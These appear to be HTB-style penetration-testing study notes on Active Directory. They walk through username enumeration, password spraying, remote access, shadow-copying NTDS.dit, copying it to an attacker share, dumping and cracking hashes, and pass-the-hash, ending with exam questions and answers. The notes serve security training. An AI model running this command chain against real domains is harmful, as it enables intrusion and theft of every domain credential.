# What is Active Directory (AD)?

**Active Directory (AD)** is Microsoft's centralized directory service used to manage users, computers, groups, policies, printers, servers, and authentication inside an organization.

Almost every Windows enterprise environment uses Active Directory.

---

# Why is Active Directory Important?

Instead of storing user accounts on every computer separately,

Active Directory stores them **centrally**.

```text
               Active Directory
                     │
      ┌──────────────┼───────────────┐
      │              │               │
      ▼              ▼               ▼
   Users        Computers        Groups
      │              │               │
      └──────────────┼───────────────┘
                     │
               Domain Controller
```

---

# Active Directory Components

|Component|Purpose|
|---|---|
|Domain Controller (DC)|Authenticates users|
|Active Directory|Stores users & computers|
|NTDS.dit|Stores domain password hashes|
|Kerberos|Primary authentication protocol|
|NTLM|Legacy authentication|

---

# Authentication Process

## Before Joining Domain

A standalone Windows machine authenticates using

```text
Windows Login
      │
      ▼
   LSASS
      │
      ▼
 SAM Database
```

Only local users can login.

---

## After Joining Domain

Once joined to Active Directory,

authentication changes.

```text
User Login
      │
      ▼
   LSASS
      │
      ▼
Kerberos / NTLM
      │
      ▼
Domain Controller
      │
      ▼
Active Directory
```

The Domain Controller validates credentials.

---

# Does SAM Still Work?

**Yes.**

Even on Domain Joined systems,

local accounts still exist.

Example

```text
WS01\Administrator
```

or

```text
.\Administrator
```

This tells Windows

"Authenticate against the local SAM database instead of Active Directory."

---

# SAM vs Active Directory

|SAM|Active Directory|
|---|---|
|Local Accounts|Domain Accounts|
|Stored on each PC|Stored on Domain Controller|
|Small Scale|Enterprise Scale|
|HKLM\SAM|NTDS.dit|

---

# What is NTDS.dit?

NTDS stands for

```text
NT Directory Services
```

The file

```text
NTDS.dit
```

is the **main Active Directory database**.

Location

```text
%SystemRoot%\NTDS\
```

---

# What Does NTDS.dit Store?

It stores

✔ Domain Users

✔ Password Hashes

✔ Groups

✔ Computers

✔ Security Information

✔ Active Directory Schema

Think of it as

```text
Entire Company
       │
       ▼
 Active Directory Database
       │
       ▼
      NTDS.dit
```

---

# Why Attack NTDS.dit?

If an attacker steals NTDS.dit,

they can potentially obtain

✔ Every Domain User

✔ Every NTLM Hash

✔ Administrator Hash

✔ KRBTGT Hash

This can compromise the **entire domain**.

---

# Attack Requirements

Before attacking AD,

you usually need

✔ Initial Foothold

✔ Internal Network Access

✔ Reachability to Domain Controller

Diagram

```text
Internet
    │
    ▼
Compromised Workstation
    │
    ▼
Internal Network
    │
    ▼
Domain Controller
```

---

# Dictionary Attacks Against AD

Dictionary attacks attempt

```text
Known Username

+

Many Passwords
```

instead of brute forcing every possible password.

---

# Username Discovery

A penetration tester should first gather employee names.

Sources include

- Company Website
    
- LinkedIn
    
- Email Addresses
    
- PDF Metadata
    
- Social Media
    

---

# Common Username Formats

Suppose employee name

```text
Jane Jill Doe
```

Possible usernames

```text
jdoe

jjdoe

janedoe

jane.doe

doe.jane

doedoehacksstuff
```

---

# Email Structure

Example

```text
jdoe@company.com
```

Usually means

```text
Username

↓

jdoe
```

---

# Google Dorks

Useful technique

```text
site:company.com filetype:pdf
```

Sometimes PDF metadata leaks usernames.

---

# Username Enumeration Workflow

```text
Company Website
       │
       ▼
Employee Names
       │
       ▼
Guess Username Format
       │
       ▼
Create Username List
       │
       ▼
Validate Users
```

---

# Creating Username List

Example

```text
bwilliamson

benwilliamson

ben.williamson

williamson.ben
```

This increases the chances of finding valid accounts.

---

# Username Anarchy

Instead of manually generating usernames,

use

```text
Username Anarchy
```

Example

```bash
./username-anarchy -i names.txt
```

Automatically creates dozens of username combinations.

---

# Why Use Username Anarchy?

```text
Employee Name

↓

Username Anarchy

↓

100+ Possible Usernames

↓

Ready for Enumeration
```

---

# Enumerating Valid Users

Tool

```text
Kerbrute
```

Purpose

✔ Username Enumeration

✔ Password Spraying

✔ Brute Force

---

# Kerbrute Command

```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

Example Output

```text
VALID USERNAME

↓

bwilliamson@inlanefreight.local
```

This confirms the account exists **without attempting passwords**.

---

# Attack Workflow

```text
Employee Names

↓

Username List

↓

Kerbrute

↓

Valid Users

↓

Password Attack
```

---

# Password Attack Using NetExec

Once valid usernames are known,

attack passwords.

Command

```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

Example

```text
winter2017

winter2016

winter2015

P@55w0rd!
```

Eventually

```text
[+]

Login Success
```

---

# Warning

Dictionary attacks generate

- Authentication Logs
    
- Failed Logins
    
- Security Alerts
    

They are **noisy**.

---

# Account Lockout

Many domains configure

```text
Account Lockout Policy
```

Too many failed logins

↓

Account Locked

Always be aware of lockout thresholds.

---

# Event Viewer Logs

Windows records

```text
Security Logs
```

Admins can review

- Failed Logons
    
- Successful Logons
    
- Event ID 4776
    

These logs are useful for detection and incident response.

---

# After Getting Credentials

Suppose we crack

```text
bwilliamson

↓

P@55w0rd!
```

Next step

Remote login.

---

# Evil-WinRM

Command

```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

Diagram

```text
Attacker

↓

Evil-WinRM

↓

PowerShell Session

↓

Domain Controller
```

---

# Check Local Groups

Command

```powershell
net localgroup
```

Look for

```text
Administrators
```

or

```text
Backup Operators
```

---

# Check User Privileges

Command

```powershell
net user bwilliamson
```

Important Output

```text
Global Group Memberships

↓

Domain Admins
```

This means

Full control over the domain.

---

# Why Domain Admin Matters

Domain Admin can

✔ Dump NTDS

✔ Reset Passwords

✔ Control Active Directory

✔ Access Any Computer

---

# Capturing NTDS.dit

NTDS.dit is actively used by Windows,

so it cannot simply be copied.

Instead,

Windows creates a

```text
Volume Shadow Copy (VSS)
```

---

# Volume Shadow Copy

Command

```powershell
vssadmin CREATE SHADOW /For=C:
```

Diagram

```text
C Drive
   │
   ▼
Volume Shadow Copy
   │
   ▼
Safe Read-Only Copy
```

---

# Copy NTDS.dit

Command

```cmd
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

---

# Why Shadow Copy?

Without VSS

```text
NTDS.dit

↓

Locked
```

With VSS

```text
NTDS.dit

↓

Readable
```

---

# Important Note

Just like SAM,

NTDS hashes are encrypted.

You also need

```text
SYSTEM
```

registry hive.

```text
NTDS.dit

+

SYSTEM

↓

Decrypt Password Hashes
```

---

# Transfer NTDS.dit

Example

```cmd
move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

Transfer to Kali.

---

# Extract Hashes

Tool

```text
Impacket Secretsdump
```

Command

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Output

```text
Administrator

Guest

krbtgt

Domain Users

NTLM Hashes
```

---

# Important Accounts

## Administrator

Highest privileged domain account.

---

## KRBTGT

Very important account.

Used by

```text
Kerberos
```

Stealing this hash may enable Golden Ticket attacks.

---

# Faster Method

Instead of manually copying files,

NetExec automates everything.

Command

```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

NetExec performs

✔ Shadow Copy

✔ Copies NTDS

✔ Extracts Hashes

✔ Deletes Temporary Files

---

# Crack Hashes

Example

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b rockyou.txt
```

Result

```text
Password1
```

---

# What if Hash Doesn't Crack?

You can still authenticate using

```text
Pass-the-Hash (PtH)
```

---

# Pass-the-Hash

Instead of

```text
Username

+

Password
```

Use

```text
Username

+

NTLM Hash
```

---

# Example

```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

Diagram

```text
NTLM Hash

↓

Pass-the-Hash

↓

Authenticate

↓

No Password Needed
```

---

# Complete Attack Chain

```text
Initial Access
      │
      ▼
Collect Employee Names
      │
      ▼
Username Anarchy
      │
      ▼
Kerbrute
      │
      ▼
Valid Users
      │
      ▼
NetExec Password Attack
      │
      ▼
Valid Credentials
      │
      ▼
Evil-WinRM
      │
      ▼
Domain Controller
      │
      ▼
Create Shadow Copy
      │
      ▼
Copy NTDS.dit
      │
      ▼
Extract Hashes
      │
      ▼
Hashcat
      │
      ▼
Password or PtH
```

---

# Important Commands

### Generate Usernames

```bash
./username-anarchy -i names.txt
```

---

### Username Enumeration

```bash
./kerbrute_linux_amd64 userenum --dc <DC-IP> --domain <DOMAIN> names.txt
```

---

### Dictionary Attack

```bash
netexec smb <DC-IP> -u USER -p WORDLIST
```

---

### Remote PowerShell

```bash
evil-winrm -i IP -u USER -p PASSWORD
```

---

### Check Local Groups

```powershell
net localgroup
```

---

### Check User Rights

```powershell
net user USERNAME
```

---

### Create Shadow Copy

```powershell
vssadmin CREATE SHADOW /For=C:
```

---

### Copy NTDS

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

---

### Dump Hashes

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

---

### Automated NTDS Dump

```bash
netexec smb TARGET -u USER -p PASSWORD -M ntdsutil
```

---

### Crack Hash

```bash
hashcat -m 1000 HASH rockyou.txt
```

---

### Pass-the-Hash

```bash
evil-winrm -i TARGET -u Administrator -H HASH
```

---

# Memory Tricks

## Active Directory Authentication

```text
Standalone PC

↓

SAM

----------------

Domain Joined

↓

Active Directory
```

---

## NTDS Attack

```text
Compromise Domain Admin

↓

Create VSS

↓

Copy NTDS.dit

↓

Copy SYSTEM

↓

Secretsdump

↓

NTLM Hashes

↓

Hashcat / PtH
```

---

# HTB / Exam Questions

### What is the primary Active Directory database?

✅ **NTDS.dit**

---

### Where is NTDS.dit stored?

```text
%SystemRoot%\NTDS\
```

---

### Which tool generates username permutations?

✅ **Username Anarchy**

---

### Which tool validates usernames without spraying passwords?

✅ **Kerbrute**

---

### Which tool performs SMB-based dictionary attacks?

✅ **NetExec**

---

### Which command creates a Volume Shadow Copy?

```powershell
vssadmin CREATE SHADOW /For=C:
```

---

### Which file is required in addition to NTDS.dit to decrypt password hashes?

✅ **SYSTEM registry hive**

---

### Which Impacket tool extracts hashes from NTDS.dit?

✅ **`impacket-secretsdump`**

---

### Which account is especially important for Kerberos attacks?

✅ **`krbtgt`**

---

### What does Pass-the-Hash use instead of a plaintext password?

✅ **The NTLM hash**

---

# 1-Minute Revision Sheet

```text
NTDS.dit
│
├── Stores Domain Users
├── NTLM Hashes
├── Groups
└── AD Schema

Tools
─────
Username Anarchy → Generate usernames
Kerbrute → Validate usernames
NetExec → Password attack
Evil-WinRM → Remote PowerShell
VSSAdmin → Shadow Copy
Secretsdump → Extract hashes
Hashcat → Crack hashes
PtH → Authenticate using NTLM hash

Important Files
───────────────
NTDS.dit
SYSTEM

Important Accounts
──────────────────
Administrator
KRBTGT

Hashcat Mode
────────────
1000 → NTLM
```

These notes preserve the important commands and concepts from your uploaded material while adding explanations, diagrams ("pics"), workflows, comparisons, memory tricks, and exam-focused summaries.